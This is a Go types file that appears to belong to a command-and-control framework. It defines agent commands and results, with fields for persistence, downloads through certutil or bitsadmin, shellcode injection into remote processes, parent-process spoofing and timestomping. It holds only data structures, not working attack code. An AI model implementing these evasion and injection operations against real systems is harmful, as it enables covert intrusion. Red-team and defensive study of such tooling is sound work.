package types

import "time"

// Command represents a command to be executed by an agent
type Command struct {
	ID              string            `json:"id"`
	AgentID         string            `json:"agent_id"`
	Command         string            `json:"command"`
	Args            []string          `json:"args,omitempty"`
	WorkingDir      string            `json:"working_dir,omitempty"`
	Timeout         int               `json:"timeout,omitempty"`
	CreatedAt       time.Time         `json:"created_at"`
	ExecutedAt      time.Time         `json:"executed_at,omitempty"`
	CompletedAt     time.Time         `json:"completed_at,omitempty"`
	Status          string            `json:"status"`
	ExitCode        int               `json:"exit_code,omitempty"`
	Output          string            `json:"output,omitempty"`
	Error           string            `json:"error,omitempty"`
	Metadata        map[string]string `json:"metadata,omitempty"`

	// Operation Type Fields
	OperationType   string `json:"operation_type,omitempty"`
	SourcePath      string `json:"source_path,omitempty"`
	DestinationPath string `json:"destination_path,omitempty"`
	FileContent     []byte `json:"file_content,omitempty"`
	IsEncrypted     bool   `json:"is_encrypted,omitempty"`

	// Process Management Fields
	ProcessName string   `json:"process_name,omitempty"`
	ProcessID   int      `json:"process_id,omitempty"`
	ProcessPath string   `json:"process_path,omitempty"`
	ProcessArgs []string `json:"process_args,omitempty"`

	// Persistence Fields
	PersistMethod string `json:"persist_method,omitempty"`
	PersistName   string `json:"persist_name,omitempty"`

	// LOLBin Fetch Fields (operation_type: lolbin_fetch)
	FetchURL    string `json:"fetch_url,omitempty"`    // URL to download from
	FetchMethod string `json:"fetch_method,omitempty"` // certutil | bitsadmin | curl | powershell

	// Level 2 — Process Injection (operation_type: inject_remote | inject_self)
	ShellcodeB64 string `json:"shellcode_b64,omitempty"` // base64-encoded shellcode
	InjectMethod string `json:"inject_method,omitempty"` // crt | apc (remote injection method)
	InjectPID    uint32 `json:"inject_pid,omitempty"`    // target PID for remote injection

	// Level 2 — PPID Spoofing (operation_type: process_start with ppid fields set)
	SpoofParentPID  uint32 `json:"spoof_parent_pid,omitempty"`  // explicit parent PID
	SpoofParentName string `json:"spoof_parent_name,omitempty"` // parent process name (e.g. "explorer.exe")

	// Level 2 — Timestomping (operation_type: timestomp)
	TimestompRef  string `json:"timestomp_ref,omitempty"`  // reference file to copy timestamps from
	TimestompTime string `json:"timestomp_time,omitempty"` // explicit RFC3339 time to set
}

// CommandResult represents the result of a command execution
type CommandResult struct {
	CommandID string `json:"command_id"`
	ExitCode  int    `json:"exit_code"`
	Output    string `json:"output"`
	Error     string `json:"error"`
	Encrypted bool   `json:"encrypted"`
}

// AgentInfo contains basic agent information
type AgentInfo struct {
	ID           string `json:"id"`
	Hostname     string `json:"hostname"`
	Username     string `json:"username"`
	OS           string `json:"os"`
	Architecture string `json:"architecture"`
	ProcessID    int    `json:"process_id"`
	Privileges   string `json:"privileges"`
	WorkingDir   string `json:"working_dir"`
}

// APIResponse represents standard API response
type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
	Error   string      `json:"error,omitempty"`
}
